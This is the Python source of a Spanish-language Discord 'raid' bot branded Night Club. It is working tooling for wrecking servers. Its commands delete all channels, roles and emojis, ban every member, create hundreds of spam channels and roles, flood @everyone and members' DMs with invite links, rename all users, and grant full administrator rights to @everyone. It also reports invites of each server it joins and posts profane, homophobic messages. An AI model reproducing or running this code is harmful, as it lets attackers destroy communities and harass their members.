import discord
import os
import keep_alive
from io import BytesIO
from discord.ext import commands
from discord import Intents
from discord import Permissions
from discord import *
from discord import Webhook, RequestsWebhookAdapter
from discord.ext import tasks, commands
from discord.ext.commands import Bot
discord.ext.commands.cooldown

intents = Intents.default()
intents.members = True

prefix = ('n!')

embed25 = discord.Embed(description = "El Comando Esta En Cooldown Para Evitar Rate Limit, Espera Unos Minutos Para Volve Usar El Comando", color = 0xffffff)

embed35 = discord.Embed(title = "Night Club", url = "https://discord.gg/yk5vXnfVNp", description = "Unanse Al Night Club Hijos De Puta", color = 0xffffff)
embed35.add_field(name="Discord", value="https://discord.gg/nightclub2022", inline = False)
embed35.add_field(name="Twitter", value="https://twitter.com/LauryPlantar",  inline = False)
embed35.add_field(name="Youtube", value="https://youtube.com/channel/UCbkn32i2WwfgK61TqNHtUYA",  inline = False)
embed35.set_thumbnail(url="https://cdn.discordapp.com/attachments/863657381434621997/1003122679051714600/a_83b9341d0e0714850a9a382669954453.gif")
embed35.set_footer(text=".gg/nightclub2022")

embed45 = discord.Embed(title = "Fucked By Night Club", url = "https://discord.gg/nightclub2022", description = "```🌙 THIS SERVER HAS BEEN FUCKED BY NIGHT CLUB 🌙```", color = 0xffffff)
embed45.add_field(name="Discord", value="https://discord.gg/nightclub2022", inline = False)
embed45.add_field(name="Twitter", value="https://twitter.com/LauryPlantar",  inline = False)
embed45.add_field(name="Youtube", value="https://youtube.com/channel/UCbkn32i2WwfgK61TqNHtUYA",  inline = False)
embed45.set_image(url="https://media.discordapp.net/attachments/978091455195271198/992580401161846785/MOSHED-2022-7-1-8-7-16.gif")
embed45.set_footer(text=".gg/nightclub2022")

bot = commands.Bot (command_prefix = "n!", intents = Intents.all(), help_command = None)

@bot.event
async def on_ready():
 await bot.change_presence(status=discord.Status.online, activity=discord.Game('Protegiendo Servidores Desde 2022'))
 

my_secret = os.environ['token']

@ bot.event
async def on_guild_channel_create (channel):
	           for i in range(0,10):
	           	await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)


@ bot.event
async def on_guild_join (guild):
  invite = None
  for channel in guild.text_channels:
    try:
      invite = await channel.create_invite()
      break
    except:
      continue

  if invite == None:
    msg = f"Joined **{guild.name}** with `{guild.member_count}` members and couldn't create an invite link."
  else:
    msg = f"Joined **{guild.name}** with `{guild.member_count}`. Invite: {invite}"

  channel = bot.get_channel(978427596217938014)
  await channel.send(msg)


@bot.command ()
async def help (ctx):
  await ctx.message.delete()
  embed = discord.Embed(description = f"Prefix de AYUDA **{prefix}help!**", color = 0xffffff, timestamp=ctx.message.created_at)
  embed.set_author(name=" ¡Comando de ayuda!")
  embed.add_field(name=f"`{prefix}nc`", value=" -Raid Automatico")
  embed.add_field(name=f"`{prefix}eadmin`", value="- Otorga Todos Los Permisos a Everyone")
  embed.add_field(name=f"`{prefix}ban`", value="- Banea a Todos Los Miembros Del Servidor")
  embed.add_field(name=f"`{prefix}mdall`", value="- Manda La Invitación De IC a Todos Los Miembros")
  embed.add_field(name=f"`{prefix}foto`", value="- Cambia El Nombre y El Icono Del Servidor")
  embed.add_field(name=f"`{prefix}roles`", value="- Elimina Todos Los Roles y Crea 200 Roles Spam")
  embed.add_field(name=f"`{prefix}delete`", value="- Elimina Todos Los Canales")
  embed.add_field(name=f"`{prefix}nc2`", value="- Crea 400 Canales y Los Spamea")
  embed.add_field(name=f"`{prefix}alert`", value="- Spamea Un Canal 100 Veces")
  embed.add_field(name=f"`{prefix}spamchannels`", value="- Spamea Todos Los Canales")
  embed.add_field(name=f"`{prefix}unban`", value="- Desbanea a Todos Los Miembros Baneados")
  embed.add_field(name=f"`{prefix}nick`", value="- Cambia El Nombre De Todos Los Usuarios")
  embed.add_field(name=f"`{prefix}emoji`", value="- Elimina Todos Los Emojis Del Servidor")
  embed.add_field(name=f"`{prefix}cemoji`", value="- Crea 49 Emojis Con La Bandera De Night Club")
  embed.add_field(name=f"`{prefix}admin`", value="- Te Otorga Un Rol Con Todos Los Permisos")
  embed.add_field(name=f"`{prefix}leave`", value="- El Bot Abandona El Servidor")
  embed.add_field(name="Server de discord", value="[NightClub](https://discord.gg/KehuhKmZRV)")
  embed.add_field(name="`Creado por` **🥀 ☨ Danrxar PS ☨ 🥀#1536**", value="- Para Mas Información a Cerca Del Bot, Entrar Al Night Club", inline = False)
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/863657381434621997/1003122679051714600/a_83b9341d0e0714850a9a382669954453.gif")
  embed.set_image(url="https://media.discordapp.net/attachments/978091455195271198/992580401161846785/MOSHED-2022-7-1-8-7-16.gif")
  embed.set_footer(text=f"{bot.user}", icon_url=f"{ctx.author.avatar_url}")
  await ctx.send(embed=embed)

@bot.command ()
async def server (ctx):
  await ctx.message.delete()
  embed = discord.Embed(title=f"{ctx.guild.name}", color = 0xffffff, timestamp=ctx.message.created_at)
  embed.set_author(name="☢ Información del servidor ☢")
  embed.add_field(name="**Fecha de Creación**", value=f"{ctx.guild.created_at}", inline = False)
  embed.add_field(name="**Creador del server**", value=f"{ctx.guild.owner}", inline = False)
  embed.add_field(name="**Miembros**", value=f"{ctx.guild.member_count}", inline = False)
  embed.add_field(name="**Canales**", value= len(ctx.guild.text_channels), inline = False)
  embed.add_field(name="**Roles**", value= len(ctx.guild.roles), inline = False)
  embed.add_field(name="**Emojis**", value= len(ctx.guild.emojis), inline = False)
  embed.add_field(name="**Mejoras del servidor**", value= len(ctx.guild.premium_subscribers), inline = False)
  embed.add_field(name="**Region del server**", value=f"{ctx.guild.region}", inline = False)
  embed.add_field(name="**ID Server**", value=f"{ctx.guild.id}", inline = False)
  embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
  embed.set_footer(text=f"{ctx.author}", icon_url=f"{ctx.author.avatar_url}")
  await ctx.send(embed=embed)

@bot.command()
@commands.cooldown(1,100,commands.BucketType.user)
async def nc(ctx, amount = 100):
  await ctx.message.delete()
  await ctx.guild.edit(name="#NightClub")
  guild = ctx.guild
  for channel in guild.channels:
      try:
        await channel.delete()
        print (f"{channel} Ha Sido Eliminado")
      except:
        pass
  for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
     except:
       pass
  for i in range(amount):
    try:  
         await guild.create_text_channel(name="☢ʀᴀɪᴅ-ʙʏ-ɴᴄ☢", topic="https://discord.gg/yk5vXnfVNp")
    except:
      pass

@nc.error
async def nc_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)

@bot.command ()
@commands.cooldown(1,100,commands.BucketType.user)
async def alert (ctx):
  await ctx.message.delete()
  for i in range(0,40):
	           	await ctx.send(" > ||@everyone|| ", embed=embed35)


@alert.error
async def alert_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)
     		 
     		 
@bot.command()
@commands.cooldown(1,110,commands.BucketType.user)
async def roles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    for i in range(200):
        try:
            await ctx.guild.create_role(name="☢ʀᴀɪᴅ-ʙʏ-ɴᴄ☢", colour = 0xffffff)
        except:
            pass

@roles.error
async def roles_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)
            
            
@bot.command()
@commands.cooldown(1,200,commands.BucketType.user)
async def mdall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
              await member.send("https://discord.gg/KehuhKmZRV")
              print (f"Se Mando El Mensaje a {member} Exitosamente")
            except:
              pass

@mdall.error
async def mdall_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)


@bot.command ()
@commands.cooldown(1,60,commands.BucketType.user)
async def delete (ctx):
		await ctx.message.delete()
		try:
			for channel in ctx.guild.channels:
				await channel.delete()
				print (f"{channel} Ha Sido Eliminado")
		except:
		 	pass

@delete.error
async def delete_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)


@bot.command()
@commands.cooldown(1,60,commands.BucketType.user)
async def emojis (ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

@emojis.error
async def emojis_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)

@bot.command()
async def admin(ctx):
  await ctx.message.delete()
  await ctx.guild.create_role(name='☢', permissions=Permissions.all(), colour = 0xffffff)
  role = discord.utils.get(ctx.guild.roles, name="☢")
  await ctx.author.add_roles(role)

@bot.command()
@commands.cooldown(1,300,commands.BucketType.user)
async def nick(ctx):
        await ctx.message.delete()
        rename_to = "discord.gg/nightclub2022"
        i = 0
        for user in list(ctx.guild.members):
            try:
                i += 1
                await user.edit(nick=f"{rename_to}")
                print(f"El Usuario {user} Fue Cambiado El Nick")
            except:
                pass

@nick.error
async def nick_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)

@bot.command()
async def foto(ctx):
        await ctx.message.delete()
        with open('NightClub/NC.gif', 'rb') as image:
            image2 = image.read()
        guild = ctx.guild
        try:
            await guild.edit(name="#NightClub", icon=image2)
        except:
            pass

@bot.command()
@commands.cooldown(1,100,commands.BucketType.user)
async def cemojis (ctx):
        await ctx.message.delete()  
        with open('NightClub/NC.png', 'rb') as image:
            image = image.read()
            guild = ctx.guild
            for emoji in range(1, 51):
                try:
                    await guild.create_custom_emoji(name="NightClub", image=image)
                    print('Emoji succesfuly created')
                except:
                    print('Emoji cant be created')

@cemojis.error
async def cemojis_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)


@bot.command ()
async def spamchannels (ctx):
		await ctx.message.delete()
		try:
			for channel in ctx.guild.channels:
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
				await channel.send(" > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp", embed=embed45)
		except:
		 	pass


@bot.command()
@commands.cooldown(1,100,commands.BucketType.user)
async def ban(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
      if member.id != ctx.author:
        try:
            await member.ban(reason="discord.gg/nightclub2022")
            print(f"{member} Ha Sido Baneado")
        except:
           pass

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)


@bot.command()
@commands.cooldown(1,400,commands.BucketType.user)
async def nc2(ctx):
        await ctx.message.delete()
        guild = ctx.message.guild
        amount = 400
        for i in range(amount):
         await guild.create_text_channel(name="☢ʀᴀɪᴅ-ʙʏ-ɴᴄ☢", topic="https://discord.gg/yk5vXnfVNp")

@nc2.error
async def nc2_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)

@bot.command()
@commands.cooldown(1,100,commands.BucketType.user)
async def unban(ctx):
        await ctx.message.delete()
        banlist = await ctx.guild.bans()
        for users in banlist:
             try:
                await ctx.guild.unban(user=users.user)
                print(f"El Usuario {banlist} Fue Desbaneado")
             except:
                pass

@unban.error
async def unban_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=embed25)


@bot.command()
async def eadmin(ctx):
  await ctx.message.delete()
  role = discord.utils.get(ctx.guild.roles, name = "@everyone")
  await role.edit(permissions = Permissions.all())


@bot.command()
async def leave(ctx):
    await ctx.message.delete()
    await ctx.channel.send("@everyone ADIOS GAYS https://discord.gg/yk5vXnfVNp")
    await ctx.guild.leave()


@ bot.event
async def on_connect ():
				  print (f"""
███╗░░██╗██╗░██████╗░██╗░░██╗████████╗  ░█████╗░██╗░░░░░██╗░░░██╗██████╗░
████╗░██║██║██╔════╝░██║░░██║╚══██╔══╝  ██╔══██╗██║░░░░░██║░░░██║██╔══██╗
██╔██╗██║██║██║░░██╗░███████║░░░██║░░░  ██║░░╚═╝██║░░░░░██║░░░██║██████╦╝
██║╚████║██║██║░░╚██╗██╔══██║░░░██║░░░  ██║░░██╗██║░░░░░██║░░░██║██╔══██╗
██║░╚███║██║╚██████╔╝██║░░██║░░░██║░░░  ╚█████╔╝███████╗╚██████╔╝██████╦╝
╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░  ░╚════╝░╚══════╝░╚═════╝░╚═════╝░
-> {bot.user} Esta Listo Para El Ataque""")

keep_alive.keep_alive()
bot.run (my_secret)